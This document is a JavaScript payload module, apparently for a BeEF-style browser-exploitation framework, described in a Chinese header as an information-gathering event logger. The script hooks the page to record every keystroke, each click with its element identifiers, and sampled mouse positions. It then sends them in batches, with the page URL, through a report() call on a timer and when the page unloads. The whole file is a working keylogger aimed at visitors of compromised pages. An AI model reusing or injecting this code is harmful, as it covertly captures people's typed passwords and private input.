// MODULE = {"desc": "事件记录:点击/按键/鼠标移动采样批量回传(BeEF Event Logger)", "category": "信息收集", "params": [["interval", "批量回传间隔ms,默认 15000"]]}
(function () {
  var buf = [];
  function log(v) {
    buf.push(v);
    if (buf.length >= 100) { flush(); }
  }
  document.addEventListener('click', function (e) {
    var t = e.target || {};
    var cn = '';
    try { cn = String(t.className || '').split(' ')[0]; } catch (err) {}
    log('c:' + (t.tagName || '') + '#' + (t.id || '') + '.' + cn);
  }, true);
  document.addEventListener('keydown', function (e) {
    var k = e.key || String.fromCharCode(e.keyCode || 0);
    log('k:' + (k.length > 1 ? '[' + k + ']' : k));
  });
  var mcount = 0;
  document.addEventListener('mousemove', function (e) {
    if (mcount++ % 50 === 0) { log('m:' + e.clientX + ',' + e.clientY); }
  });
  function flush() {
    if (!buf.length) { return; }
    var data = buf.join(' ');
    buf = [];
    report({ type: "events", url: location.href, data: data.slice(0, 2000) });
  }
  var iv = parseInt("{{interval}}", 10) || 15000;
  if (iv > 0) { setInterval(flush, iv); }
  window.addEventListener('beforeunload', flush);
})();
